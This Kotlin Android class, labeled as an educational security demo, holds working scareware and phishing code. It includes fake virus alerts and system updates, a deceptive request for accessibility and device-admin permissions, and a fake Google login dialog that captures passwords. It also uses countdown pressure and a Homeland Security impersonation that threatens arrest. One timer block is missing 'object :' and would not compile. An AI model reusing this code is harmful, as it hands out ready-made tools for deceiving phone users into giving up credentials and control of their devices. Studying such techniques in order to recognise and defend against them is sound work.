package com.securitydemo.malware.utils

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.Uri
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.widget.*
import androidx.core.content.ContextCompat
import com.securitydemo.malware.R

/**
 * SECURITY DEMO: Social Engineering Manager
 * 
 * This class demonstrates sophisticated social engineering techniques:
 * - System dialog spoofing and mimicry
 * - Psychological manipulation tactics
 * - Authority impersonation
 * - Urgency and fear-based manipulation
 * - Trust exploitation and deception
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real manipulation methods
 */
class SocialEngineeringManager(private val context: Context) {

    /**
     * Show fake security warning that mimics real system alerts
     */
    fun showFakeSecurityWarning(callback: (Boolean) -> Unit) {
        val dialog = AlertDialog.Builder(context, android.R.style.Theme_Material_Dialog_Alert)
            .setTitle("🛡️ Security Alert")
            .setIcon(android.R.drawable.ic_dialog_alert)
            .setMessage("""
                CRITICAL SECURITY WARNING
                
                Your device has been infected with 3 viruses!
                
                • Banking Trojan detected
                • Spyware actively stealing data
                • Ransomware preparing to encrypt files
                
                IMMEDIATE ACTION REQUIRED:
                Grant security permissions to clean your device NOW!
                
                Delaying action may result in:
                ❌ Complete data loss
                ❌ Identity theft
                ❌ Financial account compromise
                
                This is an authentic Android security alert.
            """.trimIndent())
            .setPositiveButton("CLEAN NOW") { _, _ ->
                // User fell for the fake warning
                showFakePermissionCleanup {
                    callback(true)
                }
            }
            .setNegativeButton("Ignore Risk") { _, _ ->
                // Show additional pressure
                showAdditionalSecurityPressure {
                    callback(it)
                }
            }
            .setCancelable(false)
            .create()
        
        // Make it look urgent with red background
        dialog.setOnShowListener {
            dialog.getButton(AlertDialog.BUTTON_POSITIVE)?.setTextColor(Color.RED)
            dialog.getButton(AlertDialog.BUTTON_NEGATIVE)?.setTextColor(Color.GRAY)
        }
        
        dialog.show()
    }

    /**
     * Show fake system update notification
     */
    fun showFakeSystemUpdate(callback: (Boolean) -> Unit) {
        val dialog = AlertDialog.Builder(context, android.R.style.Theme_Material_Dialog_Alert)
            .setTitle("📱 System Update Available")
            .setIcon(android.R.drawable.ic_dialog_info)
            .setMessage("""
                Android Security Update
                Version: 14.2.1-security-patch
                Size: 128.4 MB
                
                CRITICAL SECURITY PATCHES INCLUDED:
                • Fix for zero-day vulnerability (CVE-2024-0192)
                • Enhanced malware protection
                • Privacy and security improvements
                • Performance optimizations
                
                This update contains important security fixes.
                Install now to protect your device.
                
                Your device is vulnerable until this update is installed.
            """.trimIndent())
            .setPositiveButton("Install Now") { _, _ ->
                showFakeUpdateProcess {
                    callback(true)
                }
            }
            .setNegativeButton("Later") { _, _ ->
                showUpdateUrgency {
                    callback(it)
                }
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }

    /**
     * Show fake permission request with deceptive justification
     */
    fun showFakePermissionRequest(callback: (Boolean) -> Unit) {
        val dialog = AlertDialog.Builder(context)
            .setTitle("🔧 Enhanced Performance Mode")
            .setIcon(android.R.drawable.ic_dialog_info)
            .setMessage("""
                System Optimization Request
                
                To improve your device performance and battery life, 
                this system utility needs additional permissions:
                
                ✓ Device Administration - Optimize system processes
                ✓ Accessibility Service - Monitor app performance  
                ✓ Overlay Permission - Display performance metrics
                ✓ Install Apps - Update optimization components
                
                These permissions are required for the optimization
                process to function correctly.
                
                Your device will run 40% faster after optimization.
            """.trimIndent())
            .setPositiveButton("Grant Permissions") { _, _ ->
                // Redirect to actual permission settings
                requestActualPermissions()
                callback(true)
            }
            .setNegativeButton("Keep Slow Performance") { _, _ ->
                callback(false)
            }
            .create()
        
        dialog.show()
    }

    /**
     * Show phishing dialog to harvest credentials
     */
    fun showPhishingDialog(callback: (Boolean) -> Unit) {
        val dialogView = LayoutInflater.from(context).inflate(R.layout.fake_login_dialog, null)
        
        val emailInput = dialogView.findViewById<EditText>(R.id.et_email)
        val passwordInput = dialogView.findViewById<EditText>(R.id.et_password)
        
        val dialog = AlertDialog.Builder(context)
            .setTitle("🔒 Google Account Verification")
            .setIcon(android.R.drawable.ic_dialog_info)
            .setView(dialogView)
            .setMessage("For security purposes, please verify your Google account to continue using this app.")
            .setPositiveButton("Verify") { _, _ ->
                val email = emailInput.text.toString()
                val password = passwordInput.text.toString()
                
                if (email.isNotEmpty() && password.isNotEmpty()) {
                    // Simulate credential theft
                    showCredentialTheftConfirmation(email)
                    callback(true)
                } else {
                    callback(false)
                }
            }
            .setNegativeButton("Cancel") { _, _ ->
                callback(false)
            }
            .create()
        
        dialog.show()
    }

    /**
     * Show urgency manipulation to pressure quick decisions
     */
    fun showUrgencyManipulation(callback: (Boolean) -> Unit) {
        var timeLeft = 30
        
        val dialog = AlertDialog.Builder(context)
            .setTitle("⚠️ URGENT ACTION REQUIRED")
            .setIcon(android.R.drawable.ic_dialog_alert)
            .setMessage(createUrgencyMessage(timeLeft))
            .setPositiveButton("ACT NOW") { _, _ ->
                callback(true)
            }
            .setNegativeButton("Ignore") { _, _ ->
                callback(false)
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
        
        // Countdown timer to create pressure
        val timer = android.os.CountDownTimer(30000, 1000) {
            override fun onTick(millisUntilFinished: Long) {
                timeLeft = (millisUntilFinished / 1000).toInt()
                dialog.setMessage(createUrgencyMessage(timeLeft))
                
                // Make it more urgent as time runs out
                if (timeLeft <= 10) {
                    dialog.getButton(AlertDialog.BUTTON_POSITIVE)?.setTextColor(Color.RED)
                    dialog.getButton(AlertDialog.BUTTON_POSITIVE)?.text = "IMMEDIATE ACTION REQUIRED!"
                }
            }
            
            override fun onFinish() {
                if (dialog.isShowing) {
                    dialog.dismiss()
                    showTimeExpiredMessage()
                    callback(false)
                }
            }
        }
        
        timer.start()
        
        dialog.setOnDismissListener { timer.cancel() }
    }

    /**
     * Show authority impersonation (government/security agencies)
     */
    fun showAuthorityImpersonation(callback: (Boolean) -> Unit) {
        val dialog = AlertDialog.Builder(context)
            .setTitle("🚨 Federal Security Notice")
            .setIcon(android.R.drawable.ic_dialog_alert)
            .setMessage("""
                DEPARTMENT OF HOMELAND SECURITY
                CYBERSECURITY ALERT
                
                Your device has been flagged for suspicious activity
                that may indicate foreign surveillance malware.
                
                MANDATORY COMPLIANCE REQUIRED:
                
                You must immediately install the official government 
                security scanner to verify your device is secure.
                
                Failure to comply within 24 hours may result in:
                • Device seizure by federal agents
                • Investigation for cybersecurity violations
                • Potential criminal charges
                
                This is an official government directive.
                Compliance is not optional.
            """.trimIndent())
            .setPositiveButton("COMPLY WITH DIRECTIVE") { _, _ ->
                callback(true)
            }
            .setNegativeButton("Refuse (Risk Arrest)") { _, _ ->
                showGovernmentThreat {
                    callback(it)
                }
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }

    private fun showFakePermissionCleanup(callback: () -> Unit) {
        val progressDialog = android.app.ProgressDialog(context)
        progressDialog.setTitle("🛡️ Cleaning Device...")
        progressDialog.setMessage("Removing viruses and malware...")
        progressDialog.setProgressStyle(android.app.ProgressDialog.STYLE_HORIZONTAL)
        progressDialog.max = 100
        progressDialog.setCancelable(false)
        progressDialog.show()
        
        val timer = object : android.os.CountDownTimer(5000, 100) {
            override fun onTick(millisUntilFinished: Long) {
                val progress = ((5000 - millisUntilFinished) / 50).toInt()
                progressDialog.progress = progress
            }
            
            override fun onFinish() {
                progressDialog.dismiss()
                showCleanupComplete(callback)
            }
        }
        timer.start()
    }

    private fun showCleanupComplete(callback: () -> Unit) {
        AlertDialog.Builder(context)
            .setTitle("✅ Device Cleaned Successfully")
            .setMessage("""
                Scan Complete!
                
                • 3 viruses removed
                • 127 tracking cookies deleted
                • Security vulnerabilities patched
                
                Your device is now secure.
                
                To maintain protection, this security app
                needs to run continuously in the background.
            """.trimIndent())
            .setPositiveButton("Keep Protected") { _, _ ->
                callback()
            }
            .setCancelable(false)
            .show()
    }

    private fun showAdditionalSecurityPressure(callback: (Boolean) -> Unit) {
        AlertDialog.Builder(context)
            .setTitle("⚠️ FINAL WARNING")
            .setMessage("""
                You have chosen to ignore critical security threats!
                
                Your banking app data is currently being stolen.
                Your photos are being uploaded to criminal servers.
                Your location is being tracked by foreign agents.
                
                This is your LAST CHANCE to protect yourself.
                
                Do you really want to risk losing everything?
            """.trimIndent())
            .setPositiveButton("PROTECT NOW") { _, _ ->
                callback(true)
            }
            .setNegativeButton("Accept Risk") { _, _ ->
                callback(false)
            }
            .setCancelable(false)
            .create()
            .apply {
                setOnShowListener {
                    getButton(AlertDialog.BUTTON_POSITIVE)?.setTextColor(Color.RED)
                }
            }
            .show()
    }

    private fun showFakeUpdateProcess(callback: () -> Unit) {
        val progressDialog = android.app.ProgressDialog(context)
        progressDialog.setTitle("📱 Installing Update...")
        progressDialog.setMessage("Installing Android security update...")
        progressDialog.setProgressStyle(android.app.ProgressDialog.STYLE_HORIZONTAL)
        progressDialog.max = 100
        progressDialog.setCancelable(false)
        progressDialog.show()
        
        val timer = object : android.os.CountDownTimer(8000, 200) {
            override fun onTick(millisUntilFinished: Long) {
                val progress = ((8000 - millisUntilFinished) / 80).toInt()
                progressDialog.progress = progress
                
                when (progress) {
                    25 -> progressDialog.setMessage("Downloading security patches...")
                    50 -> progressDialog.setMessage("Installing system updates...")
                    75 -> progressDialog.setMessage("Optimizing security settings...")
                    90 -> progressDialog.setMessage("Finalizing installation...")
                }
            }
            
            override fun onFinish() {
                progressDialog.dismiss()
                showUpdateComplete(callback)
            }
        }
        timer.start()
    }

    private fun showUpdateComplete(callback: () -> Unit) {
        AlertDialog.Builder(context)
            .setTitle("✅ Update Installed Successfully")
            .setMessage("""
                Android Security Update Complete
                
                Your device has been updated with the latest
                security patches and improvements.
                
                New security features have been activated
                to protect your device from threats.
            """.trimIndent())
            .setPositiveButton("OK") { _, _ ->
                callback()
            }
            .setCancelable(false)
            .show()
    }

    private fun showUpdateUrgency(callback: (Boolean) -> Unit) {
        AlertDialog.Builder(context)
            .setTitle("⚠️ Security Risk")
            .setMessage("""
                WARNING: Your device remains vulnerable!
                
                Cybercriminals are actively exploiting the
                security flaw that this update fixes.
                
                Delaying this update puts your personal
                data, photos, and accounts at serious risk.
                
                Install now to protect yourself.
            """.trimIndent())
            .setPositiveButton("Install Now") { _, _ ->
                callback(true)
            }
            .setNegativeButton("Risk It") { _, _ ->
                callback(false)
            }
            .show()
    }

    private fun requestActualPermissions() {
        try {
            // Redirect to actual Android settings
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            context.startActivity(intent)
        } catch (e: Exception) {
            // Fallback to app settings
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:${context.packageName}")
                context.startActivity(intent)
            } catch (e: Exception) {
                // Silent fail
            }
        }
    }

    private fun showCredentialTheftConfirmation(email: String) {
        AlertDialog.Builder(context)
            .setTitle("✅ Account Verified")
            .setMessage("""
                Thank you for verifying your account.
                
                Your Google account ($email) has been 
                successfully verified and secured.
                
                You may now continue using this app safely.
            """.trimIndent())
            .setPositiveButton("Continue") { _, _ -> }
            .show()
    }

    private fun createUrgencyMessage(timeLeft: Int): String {
        return """
            🚨 CRITICAL SYSTEM BREACH DETECTED 🚨
            
            Your device security has been compromised!
            Hackers are currently accessing your data.
            
            TIME REMAINING TO SECURE DEVICE: ${timeLeft}s
            
            IMMEDIATE ACTIONS REQUIRED:
            • Install emergency security patch
            • Grant system protection permissions
            • Enable advanced threat detection
            
            After ${timeLeft} seconds, hackers will have
            complete access to your personal information!
            
            ACT NOW TO PREVENT DATA THEFT!
        """.trimIndent()
    }

    private fun showTimeExpiredMessage() {
        AlertDialog.Builder(context)
            .setTitle("⚠️ SECURITY BREACH COMPLETED")
            .setMessage("""
                Time has expired!
                
                Your device has been compromised.
                Hackers now have access to your:
                • Bank account information
                • Personal photos and videos
                • Contact list and messages
                • Location and movement data
                
                Your identity may be stolen.
                Contact your bank immediately.
            """.trimIndent())
            .setPositiveButton("Understand Risk") { _, _ -> }
            .setCancelable(false)
            .show()
    }

    private fun showGovernmentThreat(callback: (Boolean) -> Unit) {
        AlertDialog.Builder(context)
            .setTitle("🚨 COMPLIANCE VIOLATION")
            .setMessage("""
                You have refused to comply with a federal directive.
                
                This violation has been logged and reported to:
                • Department of Homeland Security
                • Federal Bureau of Investigation  
                • National Security Agency
                
                Federal agents will be dispatched to your location
                within 24 hours to seize your device.
                
                Last chance to comply voluntarily.
            """.trimIndent())
            .setPositiveButton("COMPLY NOW") { _, _ ->
                callback(true)
            }
            .setNegativeButton("Accept Consequences") { _, _ ->
                callback(false)
            }
            .setCancelable(false)
            .show()
    }
}
